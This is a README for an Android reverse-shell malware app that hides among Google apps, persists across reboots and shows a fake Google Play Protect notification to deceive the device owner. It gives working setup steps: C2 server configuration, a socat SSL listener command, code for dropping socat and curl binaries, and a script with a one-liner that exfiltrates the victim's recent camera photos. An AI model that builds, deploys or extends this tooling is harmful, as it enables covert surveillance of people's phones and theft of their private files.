# revshellSdk28

This is my Android Reverse Shell with dropping capabilities.

The idea was to create a Termux-like environment: a main APK with core functionality, capable of dropping additional binaries and scripts.

This app was made for fun and informational purposes only. I strongly discourage any illegal use of it! Please be responsible.

## Features
- **Secure SSL connection**
- **Persistence** over time and reboots
- **Hidden** and camouflaged with Google apps
- **Drops additional statically linked executable and scripts** based on CPU architecture
- Minimal code with no additional dependencies

Executable and scripts integrated by default:
- `socat` (aarch64 and x86/x64)
- `curl` (aarch64 and x86/x64)
- custom script for file exfiltration over HTTPS (`uplaod`)
- custom script to get device public IP (`ipinfo`)
- custom script to override `whoami` and set a custom "victim id" (`whoami`)

Additionally, a simple file receiver working with the `upload` script is included in this project: see "httpServerFileReceiver" folder.

## Performances

The Reverse Shell was tested on the following platform:

- Android 8  (Stock)
- Android 11 (Stock and LineageOS for MicroG)
- Android 12 (Stock and LineageOS for MicroG)
- Android 13 (Stock and LineageOS for MicroG)

A long time test was successfully performed on a real Android 12 device: shell has remained functional and reachable for 4 months.

During this period multiple reboots were performed and the device was disconnected from the network several times to test the actual persistence of the app.

## Screenshots

Below, an example of the Reverse Shell in action. On the right side of the image you can see the device App Drawer: can you identify the malicious app? From a visual perspective, the reverse shell is perfectly camouflaged with other Google Apps.

![screenshot1](screenshot1.png)

A permanent notification is shown to ensure persistence on the device. 

The content of the notification tricks the user by showing a fake protection feature from Google Play Protect:

<img src="screenshot2.png" width="25%">

If the user attempts to open the notification or application, he or she is redirected to a Google Support page

<img src="screenshot3.png" width="25%">

## Technical details

### execve

This app is able to execute ELF files using `execve` function. The usage of this function is forbidden on Android Q or above (API level *>28*).

For more details: https://android-review.googlesource.com/c/platform/system/sepolicy/+/804149

In order to compile this app, a target API level between 26 and 28 must be set.

### Statically linked binaries

On the target device there is no possibility to include any sort of dependency for the executable files or compile them from source so the malicious app drops statically linked binaries included in the APK at compile time.

To add more binaries you must:
- encode the binary to Base64
- put the encoded file in `./revshellSdk28/app/src/main/res/raw` folder
- modify `./revshellSdk28/app/src/main/java/org/android/settings/Dropper.kt`

  example:
  ```
              val payloads = arrayOf(
                arrayOf("aarch64", "socat" , readRawTextResource(context, R.raw.socat_aarch64)),
                arrayOf("aarch64", "curl"  , readRawTextResource(context, R.raw.curl_aarch64)) ,
                arrayOf("x86_64" , "socat" , readRawTextResource(context, R.raw.socat_x86_64)) ,
                arrayOf("x86_64" , "curl"  , readRawTextResource(context, R.raw.curl_x86_64))  ,
                arrayOf("any"    , "whoami", readRawTextResource(context, R.raw.whoami))       ,
                arrayOf("any"    , "ipinfo", readRawTextResource(context, R.raw.ipinfo))       ,
                arrayOf("any"    , "upload", readRawTextResource(context, R.raw.upload))
            )
  ```
  including (in order) the following parameters:
    - a specific architecture (aquired on the target machine using `uname -m`) or "any"
    - filename that will be written on device storage
    - name of the Resource File in the Android Project

Note: dropped files are written to `$BINS` folder. For more details check *Usefull variables* chapter of this documentation.

Binaries included by default are not compiled by me. 

You can find these on various Github repos. 

Following, some examples:
- https://github.com/polaco1782/linux-static-binaries
- https://github.com/ryanwoodsmall/static-binaries
- https://github.com/mosajjal/binary-tools
- https://github.com/andrew-d/static-binaries

### Command and Control settings

In order to set your C2 server you must modify `./revshellSdk28/app/src/main/java/org/android/settings/MainMaliciousCode.kt`.

Example:
```
    object C2 {
        //const val IP    = "myc2.server.it"
        const val IP    = "123.123.123.123"
        const val RPORT = 443
        const val RETRY = 5
    }
```
You must use a public IP address or an hostname. 

Additionally you must set up *port forwarding* on your router facing the Internet and ensure that no firewall is preventing the connection. 

How to set this configurations is out of the scope of this documentation.

### How to start a session

1. Generate an SSL certificate on your C2 server:
```
kali@kali$ openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -out bind.crt
kali@kali$ cat bind.key bind.crt > bind.pem
```
2. Create a listener with your favourite tool. Example:
```
kali@kali$ sudo socat -d -d OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork STDOUT
```

Note: this app is not designed to work in a multi-client environment. The easiest thing you can do to use it with multiple devices is to use a different IP port for each infected system and change the content of `./revshellSdk28/app/src/main/res/raw/whoami` to set a recognizable name for the victim.

### Notes on the `upload` script

This script permits file exfiltration over HTTPS. 

To perform this task the file is first Urlencoded then uploaded using `curl` with `--insecure` and `--dns-servers` flags.

If the request return `200 OK` the file is already on the server so it's not uploaded again.

The script is located in `./revshellSdk28/app/src/main/res/raw/upload` and **you must modify it to set your C2 server**.

Example on how to upload a file:
```
upload file.bin
```

Example on how to upload most recent photos from the Camera folder:
```
cd ./DCIM/Opencamera && find $(pwd) -type f -mtime -30 -exec upload {} \;
```

Note: *a simple Python HTTP file receiver is included in this project. See "httpServerFileReceiver" folder. Put your certificate in "https" subfolder. Received files are located in "files" subfolder. Edit "server.py" as you wish.*

### Notes on DNS configuration

In the app environment there is no DNS configuration so in order to perform a connection with certain executables you must use an IP address or set the DNS Server manually.

For example to use Curl you must use the `--dns-servers` flag.

Example: `curl --dns-servers 8.8.8.8,8.8.4.4 https://google.com`

### Usefull variables

In order to easily navigate the infected system you can use the following Environment Variables:
- `HOME` set to `/storage/self/primary`
- `DEN` set to `/data/data/org.android.settings`
- `BINS` set to `/data/data/org.android.settings/.files/usr/bin`
- `PATH` set to `${'$'}BINS:${'$'}DEN:${'$'}PATH`

# TODO

Seems like the app notification permission is not enabled by default (you must enable it manually in the system settings) on some devices running Android 13.

This problem is under investigation.
